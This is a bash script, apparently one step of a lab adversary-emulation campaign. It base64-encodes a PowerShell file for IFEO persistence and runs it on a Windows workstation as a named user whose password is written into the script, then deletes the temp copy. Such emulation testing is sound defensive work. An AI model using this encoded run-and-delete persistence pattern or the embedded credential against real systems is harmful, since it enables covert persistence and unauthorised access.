#!/usr/bin/env bash
# T106 — IFEO persistence (WT106)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"
echo "=== T106 IFEO ==="
PS1="${SCRIPT_DIR}/../windows/wt106-ifeo-run.ps1"
B64=$(base64 -w0 < "${PS1}" 2>/dev/null || base64 < "${PS1}" | tr -d '\n')
ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "\$b=[Convert]::FromBase64String('${B64}'); \$t=[IO.Path]::GetTempFileName()+'.ps1'; [IO.File]::WriteAllBytes(\$t,\$b); powershell -NoProfile -File \$t; Remove-Item \$t -Force"
echo "T106 complete"
